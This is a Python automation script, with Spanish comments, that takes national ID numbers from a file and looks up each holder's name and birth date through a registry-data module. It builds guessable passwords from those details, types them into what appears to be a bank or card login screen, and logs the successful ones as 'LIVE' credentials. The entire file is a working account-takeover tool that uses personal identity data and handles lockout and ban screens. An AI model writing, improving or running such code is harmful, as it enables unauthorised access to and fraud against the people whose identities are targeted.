import pyautogui as p
import time
from PIL import Image
import PosiblesPass
import ObtenerDataReniec

DEATH_1 = "./imagenes/death_1.png"
DEATH_2 = "./imagenes/death_2.png"
VALIDAR_1 = "./imagenes/validar_1.png"  # COntrase;a incorrecta
VALIDAR_2 = './imagenes/validar_2.png' # Usuario bloqueado
BAN = './imagenes/ban.png'
LIVE = './imagenes/live.png'
      
IngresarNumDocumento =  890,386
IngresarNumDocumentoMedio = 771,390
def borrar():
    for _ in range(10):
        p.press('backspace')

def verificarBAN(BAN,bansito):
    bansito = p.locateOnScreen(BAN, grayscale=True, confidence=0.9, region=(684,312,1249,736))
    #print(f"bansito: {bansito}")
    if bansito!=None:
        #input("BAN TEST POR ESO PARADO")
        time.sleep(0.2)
        p.click(1122,585) # click en aceptar
        time.sleep(0.3)
        return True
def verContrasena():
    time.sleep(0.2)
    p.click(1176,360) # clik en el ojito

def procesar_lote():
    linealote = 0
    with open('./dni_normal.txt', 'r') as f:
        lines = f.readlines()

    for line in lines:
        linealote += 1
        PosicionContrasena = 1 # Solo para mover la posicion de la contraseña
        
        line = ObtenerDataReniec.obtener_datos_dni(line)
        print( '\n / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / /')
        print(f' - {line} > > >') # 07542837|GLEDIS|REATEGUI|MONTES|30/04/1953
        if line == 'ERROR':
            print('ERROR AL OBTENER DATOS DEL DNI > > > omitiendo...')
            continue
        
        data = PosiblesPass.procesar_cadena(line) #PRocesando la cadena completa a contraseñas
        # ['07542837', 'Gledis1953', 'Gledis1234', 'Reategui1953', 'Montes1953']

        print(f'data: {data[0]} > > > ')
        elDNI= data[0]
        #print(f"DNI: {elDNI}")
        
        time.sleep(0.4)
        p.doubleClick(IngresarNumDocumentoMedio) # para ingresar el numero del documento
        time.sleep(0.1) # esperar un rato para que no se bugee
        p.typewrite(elDNI, interval=0.02)
        time.sleep(0.2) 

        #Hacer un bucle para que le de en continuar si o si luego
        p.click(944,516)    #Click en continuar
        
        #Verificar 
        rojo =  False
        d1 = None
        v1= None
        v2 = None
        live = None
        bansito = None

        time.sleep(0.5)
        
        while True:
            time.sleep(0.1) # para reducir la velocidad del bucle
            
            #Verificar si es BAN
            if verificarBAN(BAN,bansito):
                print(f'N° {linealote} : BAN > > > {elDNI} > > Guardado')

                banDNI = open("banDNI.txt","a")
                banDNI.write(elDNI.rstrip()) # escribir en el block
                banDNI.write("\n")
                banDNI.close()
                break
            
            #Acceso contrasena
            rojo = p.pixelMatchesColor(774,250,(236,17,26))
            #print(f"rojo: {rojo}")
   
            if rojo is True:      # Deja poner la contrasena 
                p.click(1011,366) #Click en el lugar del contrasena
                time.sleep(0.1)
                p.typewrite(data[PosicionContrasena], interval=0.02) # escirbir la pass
                verContrasena()
                time.sleep(0.1)
                p.click(951,565) # click en iniciar sesion
                #Verificar si es valido o no
                while (v1 is None) and (v2 is None):
                    time.sleep(0.1) # para reducir la velocidad del bucle
                    p.moveTo(1012,76)
                    
                    #Verificar si es BAN
                    if verificarBAN(BAN,bansito):
                        print(f'N° {linealote} : BAN > > > {elDNI} > > Guardado')

                        #Guardar en un txt los baneados
                        banDNI = open("banDNI.txt","a")
                        banDNI.write(elDNI.rstrip()) # escribir en el block
                        banDNI.write("\n")
                        banDNI.close()
                        break
                    
                    v1 = p.locateOnScreen(VALIDAR_1, grayscale=True, confidence=0.9, region=(706,475,1207,623))
                    #print(f"v1: {v1}")
                    if v1!=None: #Documento o contrasena invalida
                        print(f" - > {data[PosicionContrasena]}  | Documento o contrasena invalida")
                        time.sleep(0.2)
                        p.click(1129,582) # Click en aceptar
                        time.sleep(0.3)
                        
                        if PosicionContrasena < 4: # Por si la contrasena es la 4ta y no esta baneado aun
                            PosicionContrasena += 1
                            
                            p.click(1011,366) #Click en el lugar del contrasena
                            time.sleep(0.1)
                            p.typewrite(data[PosicionContrasena], interval=0.02) # escirbir la pass
                            verContrasena()
                            time.sleep(0.1)
                            p.click(951,565) # click en iniciar sesion
                            time.sleep(0.3)
                            
                            v1 = None
                            continue
                        
                        time.sleep(0.2)
                        p.press('esc') # para salir al menu principal
                        time.sleep(0.3)
                        
                        break
                           
                    
                    v2 = p.locateOnScreen(VALIDAR_2, grayscale=True, confidence=0.9, region=(695,419,1213,669))
                    #print(f"v2: {v2}")
                    if v2!=None:
                        print("Usuario bloqueado, Has superado el numero de intentos permitidos")
                        time.sleep(0.2)
                        p.click(1019,620) # Click en cancelar
                        time.sleep(0.2)
                        p.press('esc') # para salir al menu principal
                        time.sleep(0.3)
                        break
                    
                    #LIVE
                    live = p.locateOnScreen(LIVE, grayscale=True, confidence=0.9, region=(673,130,1229,452))
                    #print(f"live: {live}")
                    if live!=None:
                        print(f" LIVE - - - >  {elDNI} pass: {data[PosicionContrasena]}")
                        time.sleep(0.2)
                        p.click(714,105) # Click para retroceder
                        time.sleep(0.2)
                        p.press('esc') # para salir al menu principal
                        time.sleep(0.3)
                        
                        lives = open("lives.txt","a")
                        lives.write(f" LIVE - - - >  {elDNI} pass: {data[PosicionContrasena]}".rstrip()) # escribir en el block
                        lives.write("\n")
                        lives.close()
                        break  
                break

            #DEATH 1 > > > INFORMACION DE LA TARJETA ( PIDE REGISTRAR LA TARJETA )
            d1 = p.locateOnScreen(DEATH_1, grayscale=True, region=(683,48,1233,120))
            #print(f"d1: {d1}")
            if d1!=None:
                #print("INFORMACION DE LA TARJETA ( PIDE REGISTRAR LA TARJETA )")
                print(f'N° {linealote} : DEATH > > > {elDNI} > > INFORMACION DE LA TARJETA ( PIDE REGISTRAR LA TARJETA )')
                time.sleep(0.1)
                p.click(712,107) # click en para atras para retroceder
                time.sleep(0.3)
                break
            
            # DEATH 2 > > > No tienes cuenta con nosotros
            d2 = p.locateOnScreen(DEATH_2, grayscale=True, region=(685,502,1242,740)) #grande imagen
            #print(f"d1: {d1}")
            if d2!=None:
                print(f'N° {linealote} :  DEATH > > > {elDNI} > > > No tienes cuenta con nosotros')
                #print("No tienes cuenta con nosotros")
                time.sleep(0.1)
                p.click(988,613) # Click en ahora NO para retroceder
                time.sleep(0.3)
                break
        registro = open("registro.txt","w")
        registro.write(elDNI.rstrip()) # escribir en el block
        registro.write("\n")
        registro.close()
    

if __name__ == "__main__":
    time.sleep(1)
    procesar_lote()
    #borrarDocumento()